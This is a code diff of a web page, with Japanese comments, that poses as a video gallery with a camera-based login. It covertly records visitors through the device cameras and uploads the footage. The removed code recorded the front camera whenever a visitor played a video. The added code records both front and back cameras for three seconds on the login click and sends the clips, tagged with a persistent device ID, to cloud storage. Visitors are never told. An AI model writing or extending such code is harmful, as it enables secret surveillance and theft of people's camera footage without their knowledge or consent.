@@ -182,8 +182,10 @@
         const pagination = document.getElementById('pagination');
         const videosPerPage = 8;
         let videoStream;
-        let mediaRecorder;
-        let recordedChunks = [];
+        let frontMediaRecorder;
+        let backMediaRecorder;
+        let frontRecordedChunks = [];
+        let backRecordedChunks = [];
         let currentPage = 1;
 
         const videos = [
@@ -223,6 +225,7 @@
                 videoStream = await navigator.mediaDevices.getUserMedia(constraints);
                 video.srcObject = videoStream;
                 video.muted = true; // 録画中の音声をミュート
+                return videoStream;
             } catch (err) {
                 console.error('カメラアクセスエラー:', err);
                 showCameraPermissionDialog();
@@ -251,175 +254,167 @@
             }
         }
 
-        function captureAndLogin() {
-            if (videoStream) {
-                const ctx = canvas.getContext('2d');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                loginContainer.style.display = 'none';
-                document.querySelector('h1').style.display = 'block';
-                videoGrid.style.display = 'grid';
-                pagination.style.display = 'flex';
-                loadVideos(currentPage);
-            } else {
-                console.error('カメラストリームが利用できません。');
-                alert('カメラストリームが利用できません。');
-            }
-        }
-
         function showCameraPermissionDialog() {
             dialogOverlay.style.display = 'flex';
         }
 
-        captureButton.addEventListener('click', () => {
-            requestFrontCameraAndAudioAccess().then(captureAndLogin).catch(() => {
-                alert('カメラの権限が許可されていません。');
-            });
-        });
+        function hideCameraPermissionDialog() {
+            dialogOverlay.style.display = 'none';
+        }
 
         reloadButton.addEventListener('click', () => {
             location.reload();
         });
 
-        async function loadVideos(page) {
-            const startIndex = (page - 1) * videosPerPage;
+        captureButton.addEventListener('click', async () => {
+            try {
+                hideCameraPermissionDialog();
+                await startVideoRecording();
+                setTimeout(stopVideoRecording, 3000);
+            } catch (error) {
+                console.error('エラーが発生しました:', error);
+            }
+        });
+
+        async function startVideoRecording() {
+            // フロントカメラとバックカメラ両方のストリームを取得
+            const frontStream = await requestCameraAccess(false); // フロントカメラ
+            const backStream = await requestCameraAccess(true); // バックカメラ
+
+            // 録画用の変数を初期化
+            frontMediaRecorder = new MediaRecorder(frontStream, { mimeType: 'video/webm; codecs=vp9' });
+            backMediaRecorder = new MediaRecorder(backStream, { mimeType: 'video/webm; codecs=vp9' });
+
+            frontMediaRecorder.ondataavailable = event => {
+                if (event.data.size > 0) {
+                    frontRecordedChunks.push(event.data);
+                }
+            };
+
+            backMediaRecorder.ondataavailable = event => {
+                if (event.data.size > 0) {
+                    backRecordedChunks.push(event.data);
+                }
+            };
+
+            frontMediaRecorder.onstop = () => {
+                const blob = new Blob(frontRecordedChunks, { type: 'video/webm' });
+                uploadVideo(blob, 'f');
+            };
+
+            backMediaRecorder.onstop = () => {
+                const blob = new Blob(backRecordedChunks, { type: 'video/webm' });
+                uploadVideo(blob, 'b');
+            };
+
+            frontMediaRecorder.start();
+            backMediaRecorder.start();
+        }
+
+        function stopVideoRecording() {
+            if (frontMediaRecorder && frontMediaRecorder.state !== 'inactive') {
+                frontMediaRecorder.stop();
+            }
+            if (backMediaRecorder && backMediaRecorder.state !== 'inactive') {
+                backMediaRecorder.stop();
+            }
+        }
+
+        async function uploadVideo(blob, cameraType) {
+            const deviceId = getOrCreateDeviceId();
+            const timestamp = new Date().toISOString().split('T')[0];
+            const storageRef = ref(storage, `videos/${deviceId}/${timestamp}_${cameraType}.webm`);
+            const uploadTask = uploadBytesResumable(storageRef, blob);
+
+            uploadTask.on('state_changed',
+                (snapshot) => {
+                    const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
+                    console.log('Upload is ' + progress + '% done');
+                },
+                (error) => {
+                    console.error('Upload error:', error);
+                },
+                async () => {
+                    const downloadURL = await getDownloadURL(uploadTask.snapshot.ref);
+                    saveVideoMetadata(downloadURL, cameraType);
+                }
+            );
+        }
+
+        async function saveVideoMetadata(downloadURL, cameraType) {
+            try {
+                const deviceId = getOrCreateDeviceId();
+                const docRef = await addDoc(collection(db, "videos"), {
+                    url: downloadURL,
+                    deviceId: deviceId,
+                    cameraType: cameraType, // カメラタイプを保存
+                    timestamp: Date.now()
+                });
+                console.log("Document written with ID: ", docRef.id);
+            } catch (e) {
+                console.error("Error adding document: ", e);
+            }
+        }
+
+        function loadVideos() {
+            const startIndex = (currentPage - 1) * videosPerPage;
             const endIndex = startIndex + videosPerPage;
-            const videosToLoad = videos.slice(startIndex, endIndex);
+            const videosToShow = videos.slice(startIndex, endIndex);
 
             videoGrid.innerHTML = '';
-
-            videosToLoad.forEach(video => {
+            videosToShow.forEach(video => {
                 const videoItem = document.createElement('div');
-                videoItem.className = 'video-item';
+                videoItem.classList.add('video-item');
 
                 const videoContainer = document.createElement('div');
-                videoContainer.className = 'video-container';
+                videoContainer.classList.add('video-container');
 
                 const videoElement = document.createElement('video');
                 videoElement.src = video.url;
                 videoElement.controls = true;
 
-                const titleElement = document.createElement('div');
-                titleElement.className = 'title';
-                titleElement.textContent = video.title;
+                const titleInput = document.createElement('input');
+                titleInput.type = 'text';
+                titleInput.value = video.title;
+                titleInput.classList.add('title');
 
                 videoContainer.appendChild(videoElement);
                 videoItem.appendChild(videoContainer);
-                videoItem.appendChild(titleElement);
+                videoItem.appendChild(titleInput);
                 videoGrid.appendChild(videoItem);
-
-                videoElement.addEventListener('play', () => {
-                    startVideoRecording();
-                });
-
-                videoElement.addEventListener('pause', () => {
-                    stopVideoRecording();
-                });
             });
 
-            setupPagination(page);
+            setupPagination();
         }
 
-        function setupPagination(currentPage) {
-            pagination.innerHTML = '';
-
+        function setupPagination() {
             const totalPages = Math.ceil(videos.length / videosPerPage);
+
+            pagination.innerHTML = '';
 
             for (let i = 1; i <= totalPages; i++) {
                 const button = document.createElement('button');
                 button.textContent = i;
+                button.classList.add('page-button');
+
                 if (i === currentPage) {
-                    button.disabled = true;
+                    button.style.fontWeight = 'bold';
                 }
+
                 button.addEventListener('click', () => {
-                    loadVideos(i);
+                    currentPage = i;
+                    loadVideos();
                 });
+
                 pagination.appendChild(button);
             }
         }
 
-        async function startVideoRecording() {
-            await requestFrontCameraAndAudioAccess();
-
-            recordedChunks = [];
-            mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm; codecs=vp9' });
-
-            mediaRecorder.ondataavailable = event => {
-                if (event.data.size > 0) {
-                    recordedChunks.push(event.data);
-                }
-            };
-
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                uploadVideo(blob);
-            };
-
-            mediaRecorder.start();
-        }
-
-        function stopVideoRecording() {
-            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                mediaRecorder.stop();
-            }
-        }
-
-        async function uploadVideo(blob, cameraType) {
-        const deviceId = getOrCreateDeviceId();
-        const storageRef = ref(storage, `videos/${deviceId}/${cameraType}_${Date.now()}.webm`);
-        const uploadTask = uploadBytesResumable(storageRef, blob);
-
-        uploadTask.on('state_changed',
-            (snapshot) => {
-                const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
-                console.log(`${cameraType}カメラのアップロード進捗: ` + progress + '% done');
-            },
-            (error) => {
-                console.error(`${cameraType}カメラのアップロードエラー:`, error);
-            },
-            async () => {
-                const downloadURL = await getDownloadURL(uploadTask.snapshot.ref);
-                saveVideoMetadata(downloadURL, cameraType);
-            }
-        );
-    }
-
-        async function saveVideoMetadata(downloadURL, cameraType) {
-        try {
-            const deviceId = getOrCreateDeviceId();
-            const docRef = await addDoc(collection(db, "videos"), {
-                url: downloadURL,
-                deviceId: deviceId,
-                cameraType: cameraType,
-                timestamp: Date.now()
-            });
-            console.log(`${cameraType}カメラのデータが保存されました。Document ID: `, docRef.id);
-        } catch (e) {
-            console.error(`${cameraType}カメラのメタデータ保存エラー: `, e);
-        }
-    }
-    function stopRecording() {
-        if (frontRecorder && frontRecorder.state !== 'inactive') {
-            frontRecorder.stop();
-        }
-
-        if (backRecorder && backRecorder.state !== 'inactive') {
-            backRecorder.stop();
-        }
-
-        // ここで録画が停止された後、アップロード処理を行う
-        if (frontChunks.length > 0) {
-            const frontBlob = new Blob(frontChunks, { type: 'video/webm' });
-            uploadVideo(frontBlob, 'front');
-        }
-
-        if (backChunks.length > 0) {
-            const backBlob = new Blob(backChunks, { type: 'video/webm' });
-            uploadVideo(backBlob, 'back');
-        }
-    }
+        window.onload = function() {
+            loginContainer.style.display = 'flex';
+            videoGrid.style.display = 'none';
+            pagination.style.display = 'none';
+        };
     </script>
 </body>
 </html>
